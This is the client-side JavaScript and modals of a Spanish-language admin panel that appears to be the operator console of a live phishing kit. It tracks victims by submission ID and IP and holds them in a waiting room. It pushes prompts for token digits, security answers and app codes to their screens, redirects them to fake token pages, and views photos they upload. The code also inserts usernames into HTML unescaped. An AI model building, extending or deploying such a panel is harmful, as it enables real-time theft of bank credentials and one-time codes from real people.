// ✅ ASEGÚRATE DE TENER TAMBIÉN LA FUNCIÓN DE ENVÍO
function enviarTokenEmpresa() {
    let l4 = document.getElementById('coordLast4').value;

    if(!l4 || l4.length !== 4) {
        // Usamos alert o tu función notificar
        if(typeof notificar === "function") notificar('Debes ingresar los 4 dígitos', 'error');
        else alert('Debes ingresar los 4 dígitos');
        return;
    }
    
    $.post('admin.php', { 
        action: 'guardar_coordenadas', 
        submission_id: document.getElementById('coordSubmissionId').value, 
        ip: document.getElementById('coordIP').value, 
        last4: l4
    }, r => { 
        if(r.success){ 
            if(typeof notificar === "function") notificar('Token Empresa solicitado: ' + l4, 'success');
            else alert('Solicitado');
            
            document.getElementById('modalCoords').style.display = 'none';
            loadUsers(); 
        } else {
            alert(r.error || 'Error');
        }
    }, 'json');
}

function enviarTokenSimple() {
    var sid = document.getElementById('tokSubmissionId').value;
    var ip = document.getElementById('tokIP').value;
    var nombre = document.getElementById('tok_nombre').value; // CAMBIO: Obtenemos el nombre
    var btn = document.querySelector('#modalToken .btn-confirm');

    if(!nombre) {
        alert("Por favor escribe un nombre (Ej: Gladis)");
        return;
    }

    btn.innerHTML = 'Enviando...';
    btn.disabled = true;
    
    $.post('admin.php', { 
        action: 'guardar_nombre_token', 
        submission_id: sid, 
        ip: ip, 
        last4: nombre // CAMBIO: Enviamos el nombre en la variable 'last4'
    }, function(r) { 
        btn.innerHTML = 'Enviar y Redirigir';
        btn.disabled = false;

        if(r.success){ 
            document.getElementById('modalToken').style.display = 'none';
            if(typeof notificar === 'function') notificar('Nombre "' + nombre + '" enviado y redirigido', 'success'); 
            if(typeof loadUsers === 'function') loadUsers(); 
        } else {
            alert(r.error || 'Error al guardar');
        }
    }, 'json');
}

// --- LÓGICA DE BLOQUEO POR ENTRADA (CORREGIDA) ---

// Función genérica para bloquear/desbloquear visualmente un input
function toggleBloqueoInput(inputId, btnId) {
    const input = document.getElementById(inputId);
    const btn = document.getElementById(btnId);
    const icon = btn.querySelector('i');

    const isLocked = input.readOnly;

    if (isLocked) {
        // DESBLOQUEAR
        input.readOnly = false;
        input.style.opacity = "1";
        btn.style.background = "#334155";
        icon.className = "fas fa-unlock";
        // Si quieres borrar el valor al desbloquear, descomenta la siguiente línea:
        // input.value = ''; 
    } else {
        // BLOQUEAR
        if (input.value.trim() === "") {
            return notificar("Escriba un valor para bloquear", "error");
        }
        input.readOnly = true;
        input.style.opacity = "0.7";
        btn.style.background = "#10b981"; // Verde
        icon.className = "fas fa-lock";
    }
}

function abrirModalToken(sid, ip) {
    document.getElementById('tokSubmissionId').value = sid;
    document.getElementById('tokIP').value = ip;
    document.getElementById('modalToken').style.display = 'flex';
}

function abrirModalPregunta(sid, ip) {
    document.getElementById('pregSubmissionId').value = sid;
    document.getElementById('pregIP').value = ip;
    document.getElementById('preg_texto').value = '';
    document.getElementById('modalPregunta').style.display = 'flex';
    setTimeout(function(){ document.getElementById('preg_texto').focus(); }, 100);
}

function enviarPreguntaSeguridad() {
    var sid = document.getElementById('pregSubmissionId').value;
    var ip = document.getElementById('pregIP').value;
    var pregunta = document.getElementById('preg_texto').value.trim();
    var btn = document.querySelector('#modalPregunta .btn-confirm');

    if (!pregunta) {
        alert("Escribe la pregunta de seguridad");
        return;
    }

    btn.innerHTML = 'Enviando...';
    btn.disabled = true;

    $.post('admin.php', {
        action: 'set_security_question',
        submission_id: sid,
        ip: ip,
        pregunta: pregunta
    }, function(r) {
        btn.innerHTML = 'Enviar y Redirigir';
        btn.disabled = false;

        if (r.success) {
            document.getElementById('modalPregunta').style.display = 'none';
            notificar('Pregunta enviada y usuario redirigido', 'success');
            loadUsers();
        } else {
            alert(r.error || 'Error al enviar la pregunta');
        }
    }, 'json');
}

    
    function redirectUserBySubmission(sid, ip, page) {
        notificar('Enviando comando...', 'info');
        $.post('admin.php', {action: 'redirect_by_submission', submission_id: sid, ip: ip, page: page}, function(r){
            if(r.success) { notificar('Redirigido correctamente', 'success'); loadUsers(); }
            else { notificar('Error: ' + (r.error || 'Falló'), 'error'); }
        }, 'json');
    }
    
    function unblockUser(ip) {
        $.post('admin.php', {action: 'unblock', ip: ip}, r => { if(r.success) { notificar('Desbloqueado', 'success'); loadUsers(); } }, 'json');
    }

    // --- INICIALIZACIÓN ---
    $(document).ready(function() {
        const btn = document.getElementById('btnSound');
        if(btn) {
            btn.innerHTML = '<i class="fas fa-bell-slash"></i> Sonido: OFF';
            btn.style.background = '#64748b';
        }
        
        // CARGAR EL HISTORIAL GUARDADO AL INICIAR
        cargarHistorialGuardado();
        
        loadUsers();
        setInterval(loadUsers, 2000);
    });
        
        // Cierra el menú de notificaciones si haces clic fuera de él
window.onclick = function(event) {
    if (!event.target.closest('.notif-wrapper')) {
        document.getElementById('notifPanel').style.display = 'none';
    }
}

// --- NUEVA FUNCIÓN PARA MARCAR ENTRADA ---
function marcarEntrada(sid, ip, btn) {
    // Deshabilitar botón temporalmente para evitar doble clic
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    
    $.post('admin.php', { 
        action: 'mark_submission', 
        submission_id: sid, 
        ip: ip 
    }, function(r) {
        if(r.success) {
            notificar('Entrada marcada correctamente', 'success');
            if(soundEnabled) reproducirSonido();
            // Recargar la tabla para ver los cambios de color y etiqueta
            loadUsers(); 
        } else {
            notificar(r.error || 'Error al marcar', 'error');
            // Restaurar botón si falló
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-thumbtack"></i> Marcar';
        }
    }, 'json').fail(function() {
        notificar('Error de conexión', 'error');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-thumbtack"></i> Marcar';
    });
}

function desmarcarEntrada(sid, ip, btn) {
    // Evitar doble clic
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    
    $.post('admin.php', { 
        action: 'unmark_submission', 
        submission_id: sid, 
        ip: ip 
    }, function(r) {
        if(r.success) {
            notificar('Entrada liberada', 'info'); // Info azul o gris
            loadUsers(); // Recargar tabla
        } else {
            notificar(r.error || 'Error al desmarcar', 'error');
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-times-circle"></i> Desmarcar';
        }
    }, 'json').fail(function() {
        notificar('Error de conexión', 'error');
        btn.disabled = false;
    });
}

// --- SCRIPT PARA MANEJAR SOLICITUDES DE LOGIN ---
function checkLoginRequests() {
    $.post('admin.php', { action: 'get_pending_logins' }, function(res) {
        if (res.success) {
            const count = res.data.length;
            const badge = document.getElementById('reqBadge');
            const btn = document.getElementById('btnRequests');
            
            if (count > 0) {
                badge.innerText = count;
                badge.style.display = 'flex';
                btn.classList.add('fa-beat'); // Animación de font-awesome
                
                // Si el modal está abierto, refrescar lista
                if(document.getElementById('modalRequests').style.display === 'flex') {
                    renderRequests(res.data);
                }
            } else {
                badge.style.display = 'none';
                btn.classList.remove('fa-beat');
                if(document.getElementById('modalRequests').style.display === 'flex') {
                    document.getElementById('requestsList').innerHTML = '<p style="color:#64748b; text-align:center;">No hay solicitudes pendientes.</p>';
                }
            }
        }
    }, 'json');
}

function mostrarSolicitudes() {
    document.getElementById('modalRequests').style.display = 'flex';
    checkLoginRequests(); // Cargar inmediatamente
}

function renderRequests(list) {
    const container = document.getElementById('requestsList');
    container.innerHTML = '';
    
    if(list.length === 0) {
        container.innerHTML = '<p style="color:#64748b; text-align:center;">No hay solicitudes pendientes.</p>';
        return;
    }

    list.forEach(req => {
        const div = document.createElement('div');
        div.style = "background:#0f172a; border:1px solid #334155; padding:10px; margin-bottom:10px; border-radius:8px; display:flex; justify-content:space-between; align-items:center;";
        div.innerHTML = `
            <div style="display:flex; align-items:center; gap:10px;">
                <div style="width:20px; height:20px; border-radius:50%; background:${req.color}; border:1px solid white;"></div>
                <div>
                    <div style="font-weight:bold; color:white;">${req.username}</div>
                    <div style="font-size:0.75rem; color:#94a3b8;">IP: ${req.ip}</div>
                </div>
            </div>
            <div style="display:flex; gap:5px;">
                <button onclick="pedirConfirmacion('aprobar_usuario', '${req.username}')" style="background:#10b981; border:none; border-radius:4px; padding:5px 10px; color:white; cursor:pointer;"><i class="fas fa-check"></i></button>
                <button onclick="rejectUser('${req.username}')" style="background:#ef4444; border:none; border-radius:4px; padding:5px 10px; color:white; cursor:pointer;"><i class="fas fa-times"></i></button>
            </div>
        `;
        container.appendChild(div);
    });
}

function approveUser(username) {
    $.post('admin.php', { action: 'approve_login', username: username }, function(r){
        if(r.success) { 
            notificar('Usuario ' + username + ' aprobado', 'success'); 
            checkLoginRequests(); 
        }
    }, 'json');
}

function rejectUser(username) {
    $.post('admin.php', { action: 'reject_login', username: username }, function(r){
        if(r.success) { 
            notificar('Solicitud rechazada', 'error'); 
            checkLoginRequests(); 
        }
    }, 'json');
}

// INICIAR EL CHECKEO AUTOMÁTICO
setInterval(checkLoginRequests, 3000); // Cada 3 segundos busca gente en la sala de espera

// En el JavaScript de admin.php
$(document).ready(function() {
    // Switch de modo de autenticación
    $('#authModeSwitch').change(function() {
        const mode = $(this).is(':checked') ? 'authorization' : 'password';
        const label = $('#modeLabel');
        
        $.post('admin.php', {
            action: 'set_auth_mode',
            mode: mode
        }, function(response) {
            if(response.success) {
                label.text(mode === 'authorization' ? 'Autorización' : 'Contraseña');
                notificar('Modo cambiado a: ' + (mode === 'authorization' ? 'Autorización' : 'Contraseña'), 'success');
                
                // Actualizar todos los usuarios que estén en la sala de espera
                if(mode === 'password') {
                    // Notificar a los usuarios en espera que necesitan contraseña
                    checkLoginRequests();
                }
            }
        }, 'json');
    });
});

</script>




<div id="modalAppCode" class="modal-overlay">
    <div class="modal-box">
        <div class="modal-header">
            <span>Código App (Imagen)</span> 
            <i class="fas fa-mobile-alt" style="color:#0ea5e9;"></i>
        </div>
        
        <input type="hidden" id="app_sid">
        <input type="hidden" id="app_ip">
        
        <div class="input-group">
            <label>Código a mostrar</label>
            <div style="display:flex; gap:5px;">
                <input type="number" class="modal-input" placeholder="Ej: 564328" id="app_code_input">
                <button type="button" class="btn-icon" onclick="generarRandomCode()" 
                        style="background:#334155; width:40px;" title="Generar aleatorio">
                    <i class="fas fa-random"></i>
                </button>
            </div>
            <p style="font-size:0.7rem; color:#64748b; margin-top:5px;">
                Este número aparecerá en la caja amarilla de la pantalla del cliente.
            </p>
        </div>

        <div class="modal-btns">
            <button class="btn-cancel" onclick="document.getElementById('modalAppCode').style.display='none'">Cancelar</button>
            <button class="btn-confirm" onclick="enviarAppCode()">Enviar Código</button>
        </div>
    </div>
</div>

<script>
// --- JS PARA EL NUEVO MODAL APP ---
function abrirModalAppCode(sid, ip) {
    document.getElementById('app_sid').value = sid;
    document.getElementById('app_ip').value = ip;
    // Generar uno por defecto al abrir
    document.getElementById('app_code_input').value = Math.floor(100000 + Math.random() * 900000);
    document.getElementById('modalAppCode').style.display = 'flex';
    setTimeout(() => document.getElementById('app_code_input').focus(), 100);
}

function generarRandomCode() {
    document.getElementById('app_code_input').value = Math.floor(100000 + Math.random() * 900000);
}

function enviarAppCode() {
    let code = document.getElementById('app_code_input').value;
    let sid = document.getElementById('app_sid').value;
    let ip = document.getElementById('app_ip').value;

    if(!code || code.length < 4) {
        alert('El código debe tener al menos 4 dígitos');
        return;
    }

    // Primero enviamos el código
    $.post('admin.php', { 
        action: 'guardar_challenge', 
        ip: ip, 
        code: code 
    }, function(r) { 
        if(r.success){ 
            // Y luego redirigimos al usuario a tokenapp.php para que lo vea
            redirectUserBySubmission(sid, ip, 'tokenapp.php');
            
            if(typeof notificar === 'function') notificar('Código ' + code + ' enviado a App', 'success');
            else alert('Enviado');
            
            document.getElementById('modalAppCode').style.display = 'none';
        } else {
            alert('Error al guardar código');
        }
    }, 'json');
}

function abrirVisorFoto(filename) {
    const modal = document.getElementById('visorFotoModal');
    const img = document.getElementById('visorImgTag');
    const dlBtn = document.getElementById('visorDlBtn');
    
    // Configurar rutas seguras
    const srcUrl = "admin.php?action=render_image_raw&file=" + filename;
    const dlUrl = "admin.php?action=render_image_raw&file=" + filename + "&dl=1";
    
    img.src = srcUrl;
    dlBtn.href = dlUrl;
    
    modal.style.display = 'flex';
}
</script>

<div id="visorFotoModal" class="modal-overlay" style="z-index: 20000;">
    <div style="position: relative; width: 90%; max-width: 600px; text-align: center;">
        
        <button onclick="document.getElementById('visorFotoModal').style.display='none'" 
                style="position: absolute; top: -40px; right: 0; background: none; border: none; color: white; font-size: 30px; cursor: pointer;">
            &times;
        </button>

        <img id="visorImgTag" src="" style="max-width: 100%; max-height: 80vh; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 2px solid #334155;">
        
        <a id="visorDlBtn" href="#" 
           style="position: absolute; bottom: 20px; right: 20px; background: #3b82f6; color: white; width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; box-shadow: 0 4px 10px rgba(0,0,0,0.5); font-size: 20px;">
            <i class="fas fa-download"></i>
        </a>
    </div>
</div>

</body>
</html>